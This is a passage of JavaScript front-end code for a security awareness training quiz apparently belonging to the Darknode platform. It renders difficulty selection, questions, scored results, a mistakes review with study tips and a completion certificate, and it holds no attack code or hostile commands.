  function renderDifficultyPicker() {
    var mod = activeModule;
    var counts = { all: mod.questions.length, beginner: 0, intermediate: 0, advanced: 0 };
    mod.questions.forEach(function(q) { counts[q.difficulty]++; });

    main.innerHTML =
      '<div style="max-width:500px;margin:0 auto;padding:40px 0">' +
        '<button class="btn sm ghost" id="sa-diff-back" style="margin-bottom:20px">Back to Modules</button>' +
        '<h2 style="margin:0 0 4px;color:' + mod.color + '">' + esc(mod.name) + '</h2>' +
        '<p class="muted" style="margin:0 0 24px;font-size:.85rem">Select difficulty level to begin.</p>' +
        '<div style="display:grid;gap:10px">' +
          '<div class="sa-diff-btn" data-diff="all" style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:16px;cursor:pointer;transition:border-color .15s">' +
            '<div style="display:flex;align-items:center;gap:10px">' +
              '<div style="font-weight:600;font-size:.95rem;flex:1">All Levels</div>' +
              '<span class="muted" style="font-size:.78rem">' + counts.all + ' questions</span>' +
            '</div>' +
            '<div class="muted" style="font-size:.78rem;margin-top:4px">Complete test across all difficulty levels.</div>' +
          '</div>' +
          '<div class="sa-diff-btn" data-diff="beginner" style="background:var(--card);border:1px solid var(--line);border-left:3px solid #22c55e;border-radius:4px;padding:16px;cursor:pointer;transition:border-color .15s">' +
            '<div style="display:flex;align-items:center;gap:10px">' +
              '<div style="font-weight:600;font-size:.95rem;color:#22c55e;flex:1">Beginner</div>' +
              '<span class="muted" style="font-size:.78rem">' + counts.beginner + ' questions</span>' +
            '</div>' +
            '<div class="muted" style="font-size:.78rem;margin-top:4px">Fundamental concepts every employee should know.</div>' +
          '</div>' +
          '<div class="sa-diff-btn" data-diff="intermediate" style="background:var(--card);border:1px solid var(--line);border-left:3px solid #f59e0b;border-radius:4px;padding:16px;cursor:pointer;transition:border-color .15s">' +
            '<div style="display:flex;align-items:center;gap:10px">' +
              '<div style="font-weight:600;font-size:.95rem;color:#f59e0b;flex:1">Intermediate</div>' +
              '<span class="muted" style="font-size:.78rem">' + counts.intermediate + ' questions</span>' +
            '</div>' +
            '<div class="muted" style="font-size:.78rem;margin-top:4px">Applied knowledge for security-aware professionals.</div>' +
          '</div>' +
          '<div class="sa-diff-btn" data-diff="advanced" style="background:var(--card);border:1px solid var(--line);border-left:3px solid #ef4444;border-radius:4px;padding:16px;cursor:pointer;transition:border-color .15s">' +
            '<div style="display:flex;align-items:center;gap:10px">' +
              '<div style="font-weight:600;font-size:.95rem;color:#ef4444;flex:1">Advanced</div>' +
              '<span class="muted" style="font-size:.78rem">' + counts.advanced + ' questions</span>' +
            '</div>' +
            '<div class="muted" style="font-size:.78rem;margin-top:4px">Deep technical and policy knowledge for security teams.</div>' +
          '</div>' +
        '</div>' +
      '</div>';

    main.querySelector('#sa-diff-back').onclick = function() {
      activeModule = null;
      showDifficultyPicker = false;
      render();
    };

    main.querySelectorAll('.sa-diff-btn').forEach(function(btn) {
      btn.onmouseenter = function() { btn.style.borderColor = mod.color; };
      btn.onmouseleave = function() { btn.style.borderColor = 'var(--line)'; };
      btn.onclick = function() {
        selectedDifficulty = btn.dataset.diff;
        filteredQuestions = getFilteredQuestions(activeModule, selectedDifficulty);
        if (filteredQuestions.length === 0) {
          btn.style.borderColor = '#ff1744';
          return;
        }
        showDifficultyPicker = false;
        currentQ = 0;
        answers = [];
        questionTimes = [];
        showResult = false;
        reviewMistakesOnly = false;
        quizStartTime = Date.now();
        questionStartTime = Date.now();
        startTimer();
        render();
      };
    });
  }

  function renderQuiz() {
    var mod = activeModule;
    var q = filteredQuestions[currentQ];
    var pct = Math.round((currentQ / filteredQuestions.length) * 100);
    var diffColor = DIFFICULTY_COLORS[q.difficulty] || '#94a3b8';
    var diffLabel = DIFFICULTY_LABELS[q.difficulty] || q.difficulty;

    main.innerHTML =
      '<div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">' +
        '<button class="btn sm ghost" id="sa-back">Back to Modules</button>' +
        '<div style="font-weight:600;color:' + mod.color + '">' + esc(mod.name) + '</div>' +
        '<div class="muted" style="font-size:.78rem">Question ' + (currentQ + 1) + ' of ' + filteredQuestions.length + '</div>' +
        '<span style="font-size:.65rem;padding:2px 8px;border-radius:3px;background:' + diffColor + '22;color:' + diffColor + ';font-weight:600">' + esc(diffLabel) + '</span>' +
        (q.cat ? '<span class="muted" style="font-size:.7rem">' + esc(q.cat) + '</span>' : '') +
        '<div style="margin-left:auto;font-family:monospace;font-size:.78rem;color:var(--acc)" id="sa-timer">' + timerText() + '</div>' +
      '</div>' +
      '<div style="background:var(--line);height:4px;border-radius:2px;margin-bottom:20px;overflow:hidden"><div style="height:100%;width:' + pct + '%;background:' + mod.color + ';border-radius:2px;transition:width .3s"></div></div>' +
      '<div style="max-width:640px">' +
        '<div style="font-size:1rem;font-weight:600;margin-bottom:16px;line-height:1.5">' + esc(q.q) + '</div>' +
        '<div id="sa-opts" style="display:grid;gap:8px">' +
          q.opts.map(function(opt, i) {
            return '<button class="sa-opt" data-idx="' + i + '" style="text-align:left;padding:12px 16px;background:var(--card);border:1px solid var(--line);border-radius:4px;cursor:pointer;font-size:.85rem;color:var(--txt);font-family:inherit;transition:all .15s">' +
              '<span style="color:var(--acc);font-weight:600;margin-right:8px">' + String.fromCharCode(65 + i) + '.</span>' + esc(opt) +
            '</button>';
          }).join('') +
        '</div>' +
        '<div id="sa-feedback" style="margin-top:16px;display:none"></div>' +
      '</div>';

    main.querySelector('#sa-back').onclick = function() {
      stopTimer();
      activeModule = null;
      showResult = false;
      showDifficultyPicker = false;
      render();
    };

    var answered = false;
    main.querySelector('#sa-opts').onclick = function(e) {
      var btn = e.target.closest('.sa-opt');
      if (!btn || answered) return;
      answered = true;
      var idx = parseInt(btn.dataset.idx);
      var correct = idx === q.correct;
      var timeOnQ = Date.now() - questionStartTime;
      questionTimes.push(timeOnQ);
      answers.push({ question: currentQ, selected: idx, correct: correct, difficulty: q.difficulty, time: timeOnQ });

      main.querySelectorAll('.sa-opt').forEach(function(b, i) {
        if (i === q.correct) {
          b.style.borderColor = '#00e676';
          b.style.background = 'rgba(0,230,118,0.1)';
        } else if (i === idx && !correct) {
          b.style.borderColor = '#ff1744';
          b.style.background = 'rgba(255,23,68,0.1)';
        }
        b.style.cursor = 'default';
      });

      var feedbackDiv = main.querySelector('#sa-feedback');
      feedbackDiv.style.display = 'block';
      feedbackDiv.innerHTML =
        '<div style="background:var(--card);border:1px solid ' + (correct ? '#00e676' : '#ff1744') + ';border-radius:6px;padding:14px">' +
          '<div style="font-weight:600;color:' + (correct ? '#00e676' : '#ff1744') + ';margin-bottom:6px">' + (correct ? 'Correct' : 'Incorrect -- the answer is ' + String.fromCharCode(65 + q.correct)) + '</div>' +
          '<div style="font-size:.82rem;color:var(--mut);line-height:1.6">' + esc(q.explain) + '</div>' +
          '<div class="muted" style="font-size:.72rem;margin-top:6px">Time on this question: ' + formatTime(timeOnQ) + '</div>' +
        '</div>' +
        '<button class="btn" id="sa-next" style="margin-top:12px">' + (currentQ < filteredQuestions.length - 1 ? 'Next Question' : 'See Results') + '</button>';

      main.querySelector('#sa-next').onclick = function() {
        currentQ++;
        questionStartTime = Date.now();
        if (currentQ >= filteredQuestions.length) { finishQuiz(); return; }
        render();
      };
    };
  }

  function renderResults() {
    var mod = activeModule;
    var correct = answers.filter(function(a) { return a.correct; }).length;
    var total = filteredQuestions.length;
    var pct = Math.round(correct / total * 100);
    var passed = pct >= 80;
    var totalTime = 0;
    questionTimes.forEach(function(t) { totalTime += t; });
    var avgTime = total > 0 ? totalTime / total : 0;

    var diffStats = { beginner: { correct: 0, total: 0 }, intermediate: { correct: 0, total: 0 }, advanced: { correct: 0, total: 0 } };
    answers.forEach(function(a) {
      if (diffStats[a.difficulty]) {
        diffStats[a.difficulty].total++;
        if (a.correct) diffStats[a.difficulty].correct++;
      }
    });

    var mistakes = [];
    answers.forEach(function(a, i) {
      if (!a.correct) {
        mistakes.push({ index: i, answer: a, question: filteredQuestions[a.question] });
      }
    });

    if (reviewMistakesOnly && mistakes.length > 0) {
      renderMistakesReview(mod, mistakes, diffStats, pct, passed, totalTime, avgTime, correct, total);
      return;
    }

    var html =
      '<div style="max-width:700px;margin:0 auto;padding:20px 0">' +
        '<div style="text-align:center;margin-bottom:24px">' +
          '<div style="font-size:3rem;font-weight:800;color:' + (passed ? '#00e676' : '#ff1744') + '">' + pct + '%</div>' +
          '<div style="font-size:1.2rem;font-weight:600;margin:8px 0">' + (passed ? 'PASSED' : 'FAILED') + '</div>' +
          '<div class="muted" style="margin-bottom:4px">' + correct + ' of ' + total + ' correct | ' + esc(mod.name) + '</div>' +
          (timedOut ? '<div style="font-size:.8rem;color:#ff1744;margin-bottom:4px">Time expired: ' + (total - answers.length) + ' question' + (total - answers.length === 1 ? '' : 's') + ' unanswered (counted as wrong)</div>' : '') +
          '<div class="muted" style="font-size:.78rem;margin-bottom:4px">Difficulty: ' + esc(selectedDifficulty === 'all' ? 'All Levels' : DIFFICULTY_LABELS[selectedDifficulty]) + '</div>' +
          '<div class="muted" style="font-size:.8rem;margin-bottom:16px">' + (passed ? 'Congratulations! You have demonstrated competency in this module.' : 'You need 80% to pass. Review the material and try again.') + '</div>' +
        '</div>';

    // Time stats
    html += '<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px;justify-content:center">' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px 18px;text-align:center">' +
        '<div style="font-size:1.3rem;font-weight:700;color:var(--acc)">' + formatTime(totalTime) + '</div>' +
        '<div style="font-size:.68rem;color:var(--mut)">Total Time</div>' +
      '</div>' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px 18px;text-align:center">' +
        '<div style="font-size:1.3rem;font-weight:700;color:var(--acc)">' + formatTime(avgTime) + '</div>' +
        '<div style="font-size:.68rem;color:var(--mut)">Avg per Question</div>' +
      '</div>' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px 18px;text-align:center">' +
        '<div style="font-size:1.3rem;font-weight:700;color:' + (passed ? '#00e676' : '#ff1744') + '">' + mistakes.length + '</div>' +
        '<div style="font-size:.68rem;color:var(--mut)">Mistakes</div>' +
      '</div>' +
    '</div>';

    // Difficulty breakdown
    html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:8px;padding:16px;margin-bottom:16px">' +
      '<div style="font-weight:600;font-size:.9rem;margin-bottom:12px">Performance by Difficulty</div>';
    ['beginner', 'intermediate', 'advanced'].forEach(function(d) {
      var ds = diffStats[d];
      if (ds.total === 0) return;
      var dPct = Math.round(ds.correct / ds.total * 100);
      var dColor = DIFFICULTY_COLORS[d];
      html += '<div style="margin-bottom:10px">' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">' +
          '<span style="font-size:.75rem;font-weight:600;color:' + dColor + ';width:90px">' + esc(DIFFICULTY_LABELS[d]) + '</span>' +
          '<span class="muted" style="font-size:.72rem">' + ds.correct + '/' + ds.total + '</span>' +
          '<span style="font-size:.72rem;font-weight:600;color:' + dColor + ';margin-left:auto">' + dPct + '%</span>' +
        '</div>' +
        '<div style="background:var(--line);height:8px;border-radius:4px;overflow:hidden">' +
          '<div style="height:100%;width:' + dPct + '%;background:' + dColor + ';border-radius:4px;transition:width .3s"></div>' +
        '</div>' +
      '</div>';
    });
    html += '</div>';

    // Domain breakdown for practitioner mixes (questions carry their domain).
    var catStats = {};
    answers.forEach(function(a) {
      var c = filteredQuestions[a.question].cat; if (!c) return;
      catStats[c] = catStats[c] || { correct: 0, total: 0 };
      catStats[c].total++; if (a.correct) catStats[c].correct++;
    });
    var cats = Object.keys(catStats);
    if (cats.length) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:8px;padding:16px;margin-bottom:16px">' +
        '<div style="font-weight:600;font-size:.9rem;margin-bottom:12px">Performance by Domain</div>';
      cats.forEach(function(c) {
        var cs = catStats[c], cPct = Math.round(cs.correct / cs.total * 100), cColor = cPct >= 70 ? '#22c55e' : cPct >= 50 ? '#f59e0b' : '#ef4444';
        html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:.75rem">' +
          '<span style="flex:0 0 40%;min-width:0;overflow-wrap:anywhere">' + esc(c) + '</span>' +
          '<div style="flex:1;background:var(--line);height:8px;border-radius:4px;overflow:hidden"><div style="height:100%;width:' + cPct + '%;background:' + cColor + '"></div></div>' +
          '<span class="muted" style="white-space:nowrap">' + cs.correct + '/' + cs.total + '</span>' +
        '</div>';
      });
      html += '</div>';
    }

    // Action buttons
    html += '<div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-bottom:20px">' +
      '<button class="btn" id="sa-retry">Retry</button>' +
      (mistakes.length > 0 ? '<button class="btn" id="sa-review-mistakes" style="background:#ff174422;color:#ff1744;border:1px solid #ff174444">Review ' + mistakes.length + ' Mistake' + (mistakes.length > 1 ? 's' : '') + '</button>' : '') +
      '<button class="btn ghost" id="sa-home">Back to Modules</button>' +
    '</div>';

    // Question review
    html += '<div style="font-weight:600;margin-bottom:8px">Question Review</div>' +
      answers.map(function(a, i) {
        var q = filteredQuestions[a.question];
        var dColor = DIFFICULTY_COLORS[a.difficulty] || '#94a3b8';
        return '<div style="padding:8px;border-bottom:1px solid var(--line);font-size:.8rem;display:flex;gap:8px;align-items:flex-start">' +
          '<span style="color:' + (a.correct ? '#00e676' : '#ff1744') + ';font-weight:600;min-width:18px">' + (a.correct ? 'OK' : 'X') + '</span>' +
          '<span style="flex:1">' + esc(q.q) + (a.correct ? '' : ' <span class="muted">(You: ' + String.fromCharCode(65 + a.selected) + ', Correct: ' + String.fromCharCode(65 + q.correct) + ')</span>') + '</span>' +
          '<span style="font-size:.6rem;padding:1px 5px;border-radius:2px;background:' + dColor + '22;color:' + dColor + ';white-space:nowrap">' + esc(DIFFICULTY_LABELS[a.difficulty]) + '</span>' +
          '<span class="muted" style="font-size:.68rem;white-space:nowrap">' + formatTime(a.time) + '</span>' +
        '</div>';
      }).join('') +
    '</div>';

    main.innerHTML = html;

    main.querySelector('#sa-retry').onclick = function() {
      if (mod.exam !== undefined) { startMix(mod.exam); return; }
      currentQ = 0;
      answers = [];
      questionTimes = [];
      showResult = false;
      reviewMistakesOnly = false;
      quizStartTime = Date.now();
      questionStartTime = Date.now();
      startTimer();
      render();
    };
    main.querySelector('#sa-home').onclick = function() { examDeadline = 0; timedOut = false; activeModule = null; showResult = false; showDifficultyPicker = false; reviewMistakesOnly = false; render(); };
    var reviewBtn = main.querySelector('#sa-review-mistakes');
    if (reviewBtn) reviewBtn.onclick = function() { reviewMistakesOnly = true; render(); };
  }

  function renderMistakesReview(mod, mistakes, diffStats, pct, passed, totalTime, avgTime, correct, total) {
    var html =
      '<div style="max-width:700px;margin:0 auto;padding:20px 0">' +
        '<div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">' +
          '<button class="btn sm ghost" id="sa-mistakes-back">Back to Results</button>' +
          '<div style="font-weight:600;color:' + mod.color + '">' + esc(mod.name) + ' -- Review Mistakes</div>' +
          '<div class="muted" style="font-size:.78rem;margin-left:auto">' + mistakes.length + ' mistake' + (mistakes.length > 1 ? 's' : '') + '</div>' +
        '</div>';

    mistakes.forEach(function(m, idx) {
      var q = m.question;
      var a = m.answer;
      var dColor = DIFFICULTY_COLORS[q.difficulty] || '#94a3b8';
      html += '<div style="background:var(--card);border:1px solid var(--line);border-left:3px solid #ff1744;border-radius:8px;padding:16px;margin-bottom:12px">' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
          '<span style="font-size:.72rem;font-weight:700;color:#ff1744">INCORRECT</span>' +
          '<span style="font-size:.62rem;padding:1px 6px;border-radius:3px;background:' + dColor + '22;color:' + dColor + '">' + esc(DIFFICULTY_LABELS[q.difficulty]) + '</span>' +
          '<span class="muted" style="font-size:.68rem;margin-left:auto">' + formatTime(a.time) + '</span>' +
        '</div>' +
        '<div style="font-weight:600;font-size:.9rem;margin-bottom:10px;line-height:1.5">' + esc(q.q) + '</div>';
      q.opts.forEach(function(opt, oi) {
        var isYours = oi === a.selected;
        var isCorrect = oi === q.correct;
        var bg = isCorrect ? 'rgba(0,230,118,0.1)' : (isYours ? 'rgba(255,23,68,0.08)' : 'transparent');
        var border = isCorrect ? '#00e676' : (isYours ? '#ff1744' : 'var(--line)');
        var label = '';
        if (isCorrect && isYours) label = ' (Correct)';
        else if (isCorrect) label = ' (Correct Answer)';
        else if (isYours) label = ' (Your Answer)';
        html += '<div style="padding:8px 12px;margin-bottom:4px;border-radius:6px;border:1px solid ' + border + ';background:' + bg + ';font-size:.82rem">' +
          '<span style="color:var(--acc);font-weight:600;margin-right:6px">' + String.fromCharCode(65 + oi) + '.</span>' + esc(opt) +
          (label ? '<span style="font-size:.7rem;font-weight:600;color:' + (isCorrect ? '#00e676' : '#ff1744') + ';margin-left:6px">' + label + '</span>' : '') +
        '</div>';
      });
      html += '<div style="background:rgba(0,212,255,0.05);border:1px solid rgba(0,212,255,0.15);border-radius:6px;padding:10px 12px;margin-top:10px">' +
        '<div style="font-size:.72rem;font-weight:600;color:var(--acc);margin-bottom:4px">Explanation</div>' +
        '<div style="font-size:.8rem;color:var(--mut);line-height:1.5">' + esc(q.explain) + '</div>' +
      '</div>' +
      '</div>';
    });

    // Study tips based on weaknesses
    var weakAreas = [];
    var diffWeak = {};
    mistakes.forEach(function(m) {
      var d = m.question.difficulty;
      diffWeak[d] = (diffWeak[d] || 0) + 1;
    });

    html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:8px;padding:16px;margin-top:8px">' +
      '<div style="font-weight:600;font-size:.9rem;margin-bottom:10px;color:var(--acc)">Study Tips</div>';

    if (diffWeak.beginner && diffWeak.beginner > 0) {
      html += '<div style="margin-bottom:8px;font-size:.82rem;line-height:1.5">' +
        '<span style="color:#22c55e;font-weight:600">Beginner level:</span> ' +
        'You missed ' + diffWeak.beginner + ' fundamental question' + (diffWeak.beginner > 1 ? 's' : '') + '. Review the basics of ' + esc(mod.name) + '. These concepts are essential for every employee.' +
      '</div>';
    }
    if (diffWeak.intermediate && diffWeak.intermediate > 0) {
      html += '<div style="margin-bottom:8px;font-size:.82rem;line-height:1.5">' +
        '<span style="color:#f59e0b;font-weight:600">Intermediate level:</span> ' +
        'You missed ' + diffWeak.intermediate + ' applied-knowledge question' + (diffWeak.intermediate > 1 ? 's' : '') + '. Focus on real-world scenarios and how policies are applied in practice.' +
      '</div>';
    }
    if (diffWeak.advanced && diffWeak.advanced > 0) {
      html += '<div style="margin-bottom:8px;font-size:.82rem;line-height:1.5">' +
        '<span style="color:#ef4444;font-weight:600">Advanced level:</span> ' +
        'You missed ' + diffWeak.advanced + ' advanced question' + (diffWeak.advanced > 1 ? 's' : '') + '. These require deeper technical understanding. Consider reviewing security frameworks, attack methodologies, and protocol-level details.' +
      '</div>';
    }
    if (mistakes.length === 0) {
      html += '<div style="font-size:.85rem;color:#00e676;font-weight:600">No mistakes to review. Excellent work!</div>';
    }
    html += '<div style="font-size:.78rem;color:var(--mut);margin-top:8px">Tip: Retry on a higher difficulty level to deepen your understanding.</div>';
    html += '</div>';

    html += '<div style="display:flex;gap:8px;margin-top:16px">' +
      '<button class="btn" id="sa-retry2">Retry Quiz</button>' +
      '<button class="btn ghost" id="sa-home2">Back to Modules</button>' +
    '</div>';

    html += '</div>';

    main.innerHTML = html;

    main.querySelector('#sa-mistakes-back').onclick = function() { reviewMistakesOnly = false; render(); };
    main.querySelector('#sa-retry2').onclick = function() {
      currentQ = 0;
      answers = [];
      questionTimes = [];
      showResult = false;
      reviewMistakesOnly = false;
      quizStartTime = Date.now();
      questionStartTime = Date.now();
      startTimer();
      render();
    };
    main.querySelector('#sa-home2').onclick = function() { activeModule = null; showResult = false; showDifficultyPicker = false; reviewMistakesOnly = false; render(); };
  }

  function showCertificate() {
    var avg = 0;
    var counted = 0;
    MODULES.forEach(function(m) { if (scores[m.id]) { avg += Math.round(scores[m.id].score / scores[m.id].total * 100); counted++; } });
    avg = counted > 0 ? Math.round(avg / counted) : 0;
    var date = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
    var sep = '============================================================';
    var certText = sep + '\n' +
      '       SECURITY AWARENESS TRAINING CERTIFICATE\n' +
      sep + '\n\n' +
      'This certifies that the holder has successfully completed\n' +
      'all ' + MODULES.length + ' modules of the Darknode Security Awareness\n' +
      'Training Program.\n\n' +
      'Modules Completed:\n' +
      MODULES.map(function(m) {
        var s = scores[m.id];
        return '  [PASS] ' + m.name + ' -- ' + (s ? Math.round(s.score / s.total * 100) : 0) + '%' + (s && s.time ? ' (' + formatTime(s.time) + ')' : '');
      }).join('\n') + '\n\n' +
      'Overall Score: ' + avg + '%\n' +
      'Date: ' + date + '\n' +
      'Platform: Darknode (darknode.ai)\n\n' +
      sep + '\n' +
      '  This certificate was generated by the Darknode platform.\n' +
      '  Verify at: darknode.ai\n' +
      sep;

    main.innerHTML =
      '<div style="max-width:640px;margin:20px auto">' +
        '<button class="btn sm ghost" id="sa-cert-back" style="margin-bottom:12px">Back</button>' +
        '<pre style="background:var(--card);border:2px solid var(--acc);border-radius:6px;padding:24px;font-size:.78rem;white-space:pre-wrap;text-align:center;line-height:1.6">' + esc(certText) + '</pre>' +
        '<button class="btn" id="sa-cert-copy" style="margin-top:12px">Copy Certificate</button>' +
      '</div>';

    main.querySelector('#sa-cert-back').onclick = function() { render(); };
    main.querySelector('#sa-cert-copy').onclick = function() {
      navigator.clipboard.writeText(certText).then(function() {
        main.querySelector('#sa-cert-copy').textContent = 'Copied!';
        setTimeout(function() { main.querySelector('#sa-cert-copy').textContent = 'Copy Certificate'; }, 1500);
      });
    };
  }

  render();
}
